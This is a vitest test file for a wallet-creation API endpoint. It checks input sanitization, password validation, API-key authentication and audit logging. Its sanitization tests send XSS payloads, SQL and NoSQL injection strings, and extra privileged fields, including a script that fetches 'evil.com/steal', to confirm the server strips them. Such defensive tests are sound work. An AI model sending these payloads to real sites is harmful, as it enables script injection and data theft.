/* eslint-disable @typescript-eslint/no-unsafe-member-access */
/* eslint-disable @typescript-eslint/no-unsafe-call */
/* eslint-disable @typescript-eslint/no-unsafe-assignment */
/*
  UGLY but I didn't wanted to lose time on TS stuff for this test.
*/

import {
  describe,
  it,
  expect,
  beforeEach,
  vi,
} from 'vitest';
import request, { Response } from 'supertest';
import express from 'express';
import { WalletRouter } from '#/routes/WalletRouter';
import { WalletService } from '#/services/WalletService';
import { resetDb } from '#/__tests__/helpers/reset-db';
import { createApiKeyWithKnownRandomPart } from '#/__tests__/factories/ApiKeyFactory';
import { CreateWalletRequest } from '#/types/Wallet/WalletTypes';
import { db } from '#/providers/Database/PrismaClient';
import { AuditLogEventType } from '@prisma/client';

// FIX ME: CAN BE IMPROVED A LOT!
describe('WalletController - POST /wallets', () => {
  let app: express.Application;
  let validApiKey: string;

  beforeEach(async () => {
    await resetDb();

    const apiKeyData = await createApiKeyWithKnownRandomPart({
      scopes: ['WALLET_CREATE']
    });
    validApiKey = apiKeyData.fullApiKey;

    app = express();
    app.use(express.json());
    
    const walletRouter = new WalletRouter();
    walletRouter.inject(app);
  });

  describe('Input Sanitization Tests', () => {
    it('should verify actual sanitization by intercepting sanitized data', async () => {
      let capturedData: CreateWalletRequest | null = null;
      
      const mockCreateWallet = vi.fn().mockImplementation((request: CreateWalletRequest) => {
        capturedData = request;
        return Promise.resolve({
          success: true,
          data: {
            wallet_id: "test-wallet-id",
            public_address: "test-address",
            created_at: new Date().toISOString()
          }
        });
      });

      const spy = vi.spyOn(WalletService.prototype, 'createWallet').mockImplementation(mockCreateWallet);

      const maliciousInput = {
        password: "MyPass123!<script>alert('xss')</script>",
        name: "Test Wallet<img src=x onerror=alert('xss')>",
        maliciousField: "should be removed"
      };

      await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(maliciousInput)
        .expect(201);

      expect(capturedData).toBeDefined();
      expect(capturedData!.password).not.toContain('<script>');
      expect(capturedData!.password).not.toContain('alert');
      expect(capturedData!.name).not.toContain('<img');
      expect(capturedData!.name).not.toContain('onerror');
      
      expect(Object.keys(capturedData!)).toEqual(['password', 'name']);
      expect(capturedData).not.toHaveProperty('maliciousField');

      expect(mockCreateWallet).toHaveBeenCalledOnce();

      spy.mockRestore();
    });
    it('should sanitize XSS attacks in password and name', async () => {
      const maliciousInput = {
        password: "MyPassword123@<script>alert('xss')</script>",
        name: "My Wallet<img src=x onerror=alert('xss')>"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(maliciousInput)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.wallet_id).toBeDefined();
      expect(response.body.data.public_address).toBeDefined();
      expect(response.body.data.created_at).toBeDefined();
    });

    it('should sanitize SQL injection attempts', async () => {
      const maliciousInput = {
        password: "MyPass123!@DROP$TABLE&users",
        name: "Wallet OR 1=1"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(maliciousInput)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.wallet_id).toBeDefined();
    });

    it('should sanitize NoSQL injection attempts', async () => {
      const maliciousInput = {
        password: "MyPass123!@$ne&null",
        name: "Test$where&length"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(maliciousInput)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.wallet_id).toBeDefined();
    });

    it('should only allow whitelisted fields (password, name)', async () => {
      const inputWithExtraFields = {
        password: "MyPassword123!",
        name: "My Test Wallet",
        email: "hacker@evil.com",
        isAdmin: true,
        balance: 999999,
        secretKey: "malicious-key",
        userId: "fake-user-id"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(inputWithExtraFields)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.wallet_id).toBeDefined();
    });

    it('should sanitize HTML/JavaScript in inputs', async () => {
      const maliciousInput = {
        password: "Pass123!<script>fetch('http://evil.com/steal')</script>",
        name: "<iframe src='javascript:alert(1)'></iframe>Wallet Name"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(maliciousInput)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.wallet_id).toBeDefined();
    });

    it('should sanitize complex XSS payloads', async () => {
      const complexXSSInput = {
        password: "MyPass123!<svg onload=alert('xss')>",
        name: "Test</script><script>alert('xss')</script>Wallet"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(complexXSSInput)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.wallet_id).toBeDefined();
    });

    it('should handle mixed malicious content', async () => {
      const mixedMaliciousInput = {
        password: "Pass123!@DROP$TABLE&users&script&alert",
        name: "Wallet$ne&null&img&src&onerror&alert"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(mixedMaliciousInput)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.wallet_id).toBeDefined();
    });

    it('should preserve valid special characters in password', async () => {
      const inputWithValidSpecialChars = {
        password: "MyP@ssw0rd!$%&*?",
        name: "Valid Wallet Name 123"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(inputWithValidSpecialChars)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.wallet_id).toBeDefined();
    });

    it('should handle empty and null values gracefully', async () => {
      const inputWithEmptyValues = {
        password: "ValidPassword123!",
        extraField: null,
        anotherField: undefined
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(inputWithEmptyValues)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.wallet_id).toBeDefined();
    });
  });

  describe('Valid Wallet Creation Tests', () => {
    it('should create wallet with valid inputs', async () => {
      const validInput = {
        password: "SecurePassword123!",
        name: "My Awesome Wallet"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(validInput)
        .expect(201);

      expect(response.body).toMatchObject({
        success: true,
        data: {
          wallet_id: expect.any(String),
          public_address: expect.any(String),
          created_at: expect.any(String)
        }
      });

      expect(response.body.data.public_address).toMatch(/^5[A-Za-z0-9]+$/);
      expect(response.body.data.wallet_id).toMatch(
        /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/
      );
    });

    it('should create wallet without name (optional field)', async () => {
      const validInput = {
        password: "SecurePassword123!"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(validInput)
        .expect(201);

      expect(response.body.success).toBe(true);
      expect(response.body.data.wallet_id).toBeDefined();
      expect(response.body.data.public_address).toBeDefined();
    });
  });

  describe('Validation Error Tests', () => {
    it('should reject password that is too short', async () => {
      const invalidInput = {
        password: "short",
        name: "Test Wallet"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(invalidInput)
        .expect(400);

      expect(response.body).toMatchObject({
        success: false,
        error: {
          code: "VALIDATION_ERROR",
          message: "Invalid request parameters",
          details: {
            field: "password",
            reason: "Password must be between 8 and 64 characters long"
          }
        },
        timestamp: expect.any(String)
      });
    });

    it('should reject password without complexity requirements', async () => {
      const invalidInput = {
        password: "simplepassword",
        name: "Test Wallet"
      };

      const response: Response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(invalidInput)
        .expect(400);

      expect(response.body).toMatchObject({
        success: false,
        error: {
          code: "VALIDATION_ERROR",
          message: "Invalid request parameters",
          details: {
            field: "password",
            reason: expect.stringContaining("uppercase")
          }
        }
      });
    });

    it('should reject empty password', async () => {
      const invalidInput = {
        password: "",
        name: "Test Wallet"
      };

      const response = await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(invalidInput)
        .expect(400);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe("VALIDATION_ERROR");
    });
  });

  describe('Authentication Tests', () => {
    it('should reject request without API key', async () => {
      const validInput = {
        password: "SecurePassword123!",
        name: "Test Wallet"
      };

      const response = await request(app)
        .post('/wallets')
        .send(validInput)
        .expect(400);

      expect(response.body).toMatchObject({
        success: false,
        error: {
          code: "VALIDATION_ERROR",
          message: "Invalid request parameters",
          details: {
            field: "x-api-key",
            reason: "x-api-key header is required"
          }
        }
      });
    });

    it('should reject request with invalid API key', async () => {
      const validInput = {
        password: "SecurePassword123!",
        name: "Test Wallet"
      };

      const response = await request(app)
        .post('/wallets')
        .set('x-api-key', 'invalid-api-key')
        .send(validInput)
        .expect(401);

      expect(response.body.success).toBe(false);
      expect(response.body.error.code).toBe("UNAUTHENTICATED");
    });
  });

  describe('Audit Logging Tests', () => {
    // IMPROVEMENT: Have a way to not log while testing (with an environment variable)
    // Here we would set the environment variable to true

    it('should log successful wallet creation', async () => {
      const validInput = {
        password: "SecurePassword123!",
        name: "Test Wallet"
      };

      await request(app)
        .post('/wallets')
        .set('x-api-key', validApiKey)
        .send(validInput)
        .expect(201);

      const auditLog = await db.auditLog.findFirst({
        orderBy: {
          createdAt: 'desc'
        }
      });
      const wallet = await db.wallet.findFirst({
        orderBy: {
          createdAt: 'desc'
        }
      });
      expect(auditLog).toBeDefined();
      expect(auditLog!.eventType).toBe(AuditLogEventType.WALLET_CREATION);
      expect(auditLog!.success).toBe(true);
      expect(auditLog!.metadata).toEqual({
        error: null,
        wallet_id: wallet!.id
      });
    });

    // TODO: Implement this test
    // it('should log failed wallet creation', async () => {
    // });
  });
});
